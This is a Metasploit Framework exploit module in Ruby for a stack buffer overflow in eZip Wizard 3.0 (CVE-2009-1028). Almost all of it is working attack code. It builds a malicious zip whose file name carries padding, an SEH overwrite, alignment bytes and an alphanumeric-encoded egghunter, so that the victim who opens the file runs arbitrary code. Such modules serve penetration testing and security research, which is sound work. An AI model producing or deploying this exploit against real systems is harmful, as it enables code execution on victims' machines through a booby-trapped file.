# $Id: ezip_wizard_bof.rb 12428 2011-04-25 01:06:34Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
require &#039;rex/zip&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;eZip Wizard 3.0 Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow vulnerability in
                version 3.0 of ediSys Corp.&#039;s eZip Wizard.
 
                In order for the command to be executed, an attacker must convince someone to
                open a specially crafted zip file with eZip Wizard, and access the specially
                file via double-clicking it. By doing so, an attacker can execute arbitrary
                code as the victim user.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;fl0 fl0w&#039;,  #Initial discovery, poc
                    &#039;jduck&#039;,     #Metasploit
                    &#039;Lincoln&#039;,   #Complete Metasploit port
                ],
            &#039;Version&#039;        => &#039;$Revision: 12428 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-1028&#039; ],
                    [ &#039;OSVDB&#039;, &#039;52815&#039; ],
                    [ &#039;BID&#039;, &#039;34044&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.edisys.com/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/8180&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/12059/&#039; ],
                ],
         &#039;Platform&#039;          => [ &#039;win&#039; ],
         &#039;Payload&#039;           =>
                {
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumMixed,
                },
            &#039;Targets&#039;        =>
                [
                    [&#039;Windows Universal&#039;, { &#039;Offset&#039; => 58, &#039;Ret&#039; => 0x10020710 }],
                ],
            &#039;DisclosureDate&#039; => &#039;Mar 09 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The output file name.&#039;, &#039;msf.zip&#039;]),
                OptString.new(&#039;USERNAME&#039;, [ true, &#039;Username&#039;, &#039;&#039;])
            ], self.class)
 
    end
 
    def exploit
 
        #These badchars do not apply to the final payload
        badchars = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0d\x2F\x5c\x3c\x3e\x5e\x7e"
 
        eggoptions =
        {
                :checksum => true,
                :eggtag => &#039;w00t&#039;
        }
 
        hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)
 
        [ &#039;x86/alpha_mixed&#039;].each { |name|
                enc = framework.encoders.create(name)
                if name =~/alpha/
                    enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;ESP&#039; })
                end
            hunter = enc.encode(hunter, nil, nil, platform)
        }
 
        #Username length affects our offset to hit SEH correctly
        if datastore[&#039;USERNAME&#039;].length >= 9
            padding = rand_text_alpha(target[&#039;Offset&#039;] - 8)
        else
            padding = rand_text_alpha(target[&#039;Offset&#039;] - datastore[&#039;USERNAME&#039;].length)
        end
 
        fname  = padding
        fname << "\x61\x61\x7a\x04"      #nseh, align + conditional jmp
        fname << [target.ret].pack(&#039;V&#039;)  #seh
        fname << "\x61" * 29             #align for hunter
        fname << "\x58\x58\x41"          #align for hunter
        fname << hunter
        fname << egg
 
        zip = Rex::Zip::Archive.new
        xtra = [0xdac0ffee].pack(&#039;V&#039;)
        comment = [0xbadc0ded].pack(&#039;V&#039;)
        zip.add_file(fname, xtra, comment)
 
        # Create the file
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file...")
 
        file_create(zip.pack)
    end
 
end



